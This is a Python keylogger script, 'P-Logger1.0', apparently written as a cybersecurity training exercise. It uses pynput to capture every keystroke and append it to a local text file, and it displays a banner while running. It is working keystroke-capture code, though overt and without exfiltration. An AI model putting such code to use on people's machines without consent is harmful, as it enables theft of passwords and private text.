from pynput import keyboard
import sys
from termcolor import cprint 
from pyfiglet import figlet_format
from colorama import init
from itertools import cycle

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'Key pressed: {key.char}\n')
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f'Key pressed: {key}\n')

def on_release(key):
    # This function is kept to avoid stopping the listener on key release
    pass

def main():
    # Create or clear the log file at the start
    open(log_file, "w").close()
    
    init(strip=not sys.stdout.isatty()) # strip colors if stdout is redirected
    cprint(figlet_format('P-Logger1.0'),'red', 'on_black', attrs=['bold'])
    print("Welcome to P-Logger1.0 | Made by 6p@rtsXX | Prodigy CS-04")
    print("==========================================================")
    print("Logging...")   
    # Start the keylogger
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("\nKeylogger terminated by user.")

if __name__ == "__main__":
    main()
